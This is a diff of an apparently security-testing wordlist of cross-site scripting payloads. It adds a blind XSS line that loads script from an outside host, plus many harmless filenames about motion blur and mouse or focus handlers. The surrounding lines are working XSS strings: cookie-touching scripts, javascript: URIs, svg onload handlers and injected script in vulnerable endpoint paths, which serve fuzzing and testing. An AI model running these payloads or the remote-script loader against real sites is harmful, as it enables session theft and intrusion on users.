@@ -2690,6 +2690,7 @@ ${alert(1337)}`' autofocus
 -1<xml id="x"><a><b><script>document.cookie=true;</script>;</b></a></xml>
 -1<xml id=i><x><c><![cdata[<img src="javas]]<![cdata[cript:document.cookie=true;">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
 -1<xml src="javascript:document.cookie=true;">
+-> payload for blind xss: <script src=rohan-website.com></script>
 -alert(1)-
 -alert(1)//\
 -alert(1)}//\
@@ -20632,6 +20633,7 @@ acart2_0/signin.asp?msg=<script>alert(\"test\")</script>
 accountlogin_onmousedown
 accountlogin_onmouseup
 acs/..;/admin/public/login.jsp?error=%3cscript%3ealert(document.domain)%3c/script%3e
+actionmouse
 activity_nonfocusingscrollview.xml
 add name <script>alert('vl')</script>
 add topic <iframe src=http://www.vulnerability-lab.com>
@@ -20697,6 +20699,7 @@ amcolumn/examples/amcolumn/amcolumn.swf?chart_settings=<settings></settings>&cha
 antispam/listdel?file=blacklist&name=b<script>alert('vulnerable')</script>&startline=0
 antispam/listdel?file=whitelist&name=a<script>alert('vulnerable')</script>&startline=0(naturally)
 antonmouse
+antonmouse1984
 anyonmouse
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -20731,6 +20734,10 @@ a{b:`function(){alert(1)}()`;}
 a{xxx:expression(if(!window.x){alert('xss');window.x=1;})}
 background-image: url(javascript:prompt(1))
 badging/badge_template_v0.php?layout=1&type="/><svg/onload="alert(document.domain)"/>
+basiccombopopup$invocationmousehandler.class
+basiccombopopup$invocationmousehandler.h
+basiccombopopup$invocationmousemotionhandler.class
+basiccombopopup$invocationmousemotionhandler.h
 basiccombopopup.invocationmousehandler
 basiccombopopup.invocationmousemotionhandler
 bb000001.pl<script>alert('vulnerable')</script>
@@ -20766,6 +20773,8 @@ button_onmousedown.xml
 button_onmouseup.xml
 buttonfocused.xml
 buttonmousecontrol
+buttonmousecontrol.ino
+buttonmousecontrol.txt
 c%00""<script>alert(0);</script>
 c="javascript:";
 ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog%2f
@@ -20774,6 +20783,17 @@ caframe_onmousewheel
 calendar.php?year=<script>alert(document.cookie);</script>&month=03&day=05
 calendar/calendar_form.php/"><script>alert(document.domain)</script>
 calendarexpress/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
+cameramotionblur.cs
+cameramotionblur.cs.meta
+cameramotionblur.js
+cameramotionblur.js.meta
+cameramotionblur.shader
+cameramotionblur.shader.meta
+cameramotionblurdx11.shader
+cameramotionblurdx11.shader.meta
+cameramotionblureditor.cs
+cameramotionblureditor.cs.meta
+cameramotionblureditor.js
 canonfocus
 carbon/admin/login.jsp?loginstatus=false&errorcode=%27);alert(document.domain)//
 carbon/admin/login.jsp?msgid=%27%3balert(%27nuclei%27)%2f%2f
@@ -20958,6 +20978,8 @@ echo('ipt&gt;alert(\"xss\")&lt;/script&gt;'); ?&gt;
 echo('ipt>alert("crosssitescripting")</script>'); ?>
 echo('ipt>alert("xss")</script>'); ?>
 editor_tools/module?type=files/admin"><script>alert(document.domain)</script>&params=filetype=images#path=
+eent/onblur.html
+eent/onfocus.html
 element[attribute='<img src=x onerror=alert('xss');>
 email.php?forum_contact=\"><script>foo</script>
 emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
@@ -21275,6 +21297,8 @@ goform/login_process?username=test%22%3e%3csvg/onload=alert(document.domain)%3e
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="http://www.whatismyip.com/"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe src="whatismyip.com"></iframe>
 googlebot/2.1 (+http://www.googlebot.com/bot.html) <iframe></iframe>
+gpuimagemotionblurfilter.h
+gpuimagemotionblurfilter.m
 gsf_onmousedown
 gsf_onmouseup
 guest/users/forgotten?email=%22%3e%3cscript%3econfirm(document.domain)%3c/script%3e
@@ -21726,6 +21750,8 @@ loginscrollframe_onmousewheel
 loginscrollupbutton_onmousedown
 logout?next=%208%22onmouseover=%22alert(document.domain)
 logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain)
+londonfocus1
+londonfocus2476
 lostpassword.php/n4gap%22%3e%3cimg%20src=a%20onerror=alert(%22document.domain%22)%3e
 magmi/web/ajax_gettime.php?prefix=%22%3e%3cscript%3ealert(document.domain);%3c/script%3e%3c
 mail/addressaction.html?id=<userid#>&newaddress=1&addressname=<script>alert('vulnerable')</script>&addressemail=junk@example.com
@@ -21778,11 +21804,28 @@ monmouse
 moonmouse
 motionblur
 motionblur-no
+motionblur.c
+motionblur.cginc
+motionblur.cginc.meta
+motionblur.cs
+motionblur.cs.meta
 motionblur.exe
+motionblur.shader
+motionblur.shader.meta
 motionblur.xml
 motionblur.zip
 motionblur2.zip
+motionblurclear.shader
+motionblurclear.shader.meta
+motionblurcomponent.cs
+motionblurcomponent.cs.meta
+motionblurcomponent.java
 motionblurimage.xml
+motionblurjitter.png.meta
+motionblurmodel.cs
+motionblurmodel.cs.meta
+motionblurmodeleditor.cs
+motionblurmodeleditor.cs.meta
 motionblurz1
 mozilla&lt;img src=javascript:qss=7&gt;
 mozilla&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=javascript:qss=7&quot;&gt;
@@ -21847,6 +21890,7 @@ onfocus-com
 onfocus.html
 onfocus=javascript:alert(123) autofocus
 onfocus=javascript:alert(9) autofocus
+onfocuschange.java
 onfocusin
 onfocusout
 onfocusti
@@ -21877,6 +21921,7 @@ onmouseover=alert(1);
 onmouseoverprompt1
 onmouseup
 onmousewheel
+onmousewheel.sqf
 onmousewheel_cardfarmescorllitem
 open`javascript:alert(1)//#${'_self'}`
 openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;
@@ -22002,6 +22047,7 @@ replymsg.php?send=1&destin=<script>alert('vulnerable')</script>
 result => javascript: + /*click me! + #*/alert(1)
 result => javascript: +'click me! + #'-alert(1)
 result => javascript:alert(1)
+ronmouse
 rouge::lexers::javascript::num
 rouge::lexers::javascript::str
 rpc.php?q="><script>alert(document.cookie)</script>
@@ -22057,6 +22103,8 @@ settimeout('alert(1)',0)
 settimeout(['alert(/@garethheyes/)']); #chrome #safari #firefox
 settimeout(['confirm(4)']);
 settimeout`alert(1);//${1000}`
+setting.callback.onmousedown.html
+setting.callback.onmouseup.html
 setup.exe?<script>alert('vulnerable')</script>&page=list_users&user=p
 sgdynamo.exe?htname=<script>alert('vulnerable')</script>
 shape_showbuttonfocused.xml
@@ -22144,6 +22192,8 @@ test.php?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test.shtml?%3cscript%3ealert('vulnerable')%3c%2fscript%3e=x
 test=scriptx=document.createelement(%27script%27);x.innerhtml=%27confirm(location)%27;document.body.appendchild(x);/script&notbot=uzxgjmco8aoaafuckteaaaan
 testcgi.exe?<script>alert(document.cookie)</script>
+testfocusonblur.html
+testfocusonblur.java
 tests/kwf/js/clearonfocus/seleniumtest.php
 tests/kwf/js/clearonfocus/testcontroller.php
 tests/zend/http/client/_files/testredirections.php?redirection=3&param=<img/src=x%20onerror=alert(document.domain)>
@@ -22190,6 +22240,7 @@ user.php?op=confirmnewuser&module=ns-newuser&uname=%22%3e%3cimg%20src=%22javascr
 user.php?op=userinfo&uname=<script>alert('hi');</script>
 usercp.php?function=avataroptions:javascript:alert(%27vulnerable%27)
 users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+validateonblur.html
 var a = "</script> <script> alert('xss !'); </script> <script>";
 var a = &quot;&lt;/script&gt; &lt;script&gt; alert('xss !'); &lt;/script&gt; &lt;script&gt;&quot;;
 var a=0; ((a == 1) ? 2 : alert(1));//
